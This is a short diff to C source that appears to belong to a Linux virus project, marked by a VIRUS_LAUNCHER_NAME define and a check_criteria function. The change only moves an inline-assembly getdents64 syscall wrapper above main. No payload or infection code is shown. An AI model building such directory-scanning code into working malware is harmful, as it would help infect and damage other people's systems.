@@ -17,8 +17,8 @@
 #include <sys/prctl.h>
 #include <sys/time.h>
 #define VIRUS_LAUNCHER_NAME "main"
-int _getdents64(unsigned int fd, struct linux_dirent64 *dirp,
-                unsigned int count);
+// int _getdents64(unsigned int fd, struct linux_dirent64 *dirp,
+// unsigned int count);
 struct linux_dirent64
 {
     ino_t d_ino;             /* 64-bit inode number */
@@ -82,6 +82,21 @@ int check_criteria(char *filename)
     return 0;
 }
 
+int _getdents64(unsigned int fd, struct linux_dirent64 *dirp,
+                unsigned int count)
+{
+    long ret;
+    __asm__ volatile(
+        "mov %0, %%rdi\n"
+        "mov %1, %%rsi\n"
+        "mov %2, %%rdx\n"
+        "mov $217, %%rax\n"
+        "syscall" ::"g"(fd),
+        "g"(dirp), "g"(count));
+    asm("mov %%rax, %0"
+        : "=r"(ret));
+    return (int)ret;
+}
 int main()
 {
     char *dir = NULL, *fpath;
@@ -119,20 +134,4 @@ int main()
     }
     // }
     return 0;
-}
-
-int _getdents64(unsigned int fd, struct linux_dirent64 *dirp,
-                unsigned int count)
-{
-    long ret;
-    __asm__ volatile(
-        "mov %0, %%rdi\n"
-        "mov %1, %%rsi\n"
-        "mov %2, %%rdx\n"
-        "mov $217, %%rax\n"
-        "syscall" ::"g"(fd),
-        "g"(dirp), "g"(count));
-    asm("mov %%rax, %0"
-        : "=r"(ret));
-    return (int)ret;
 }
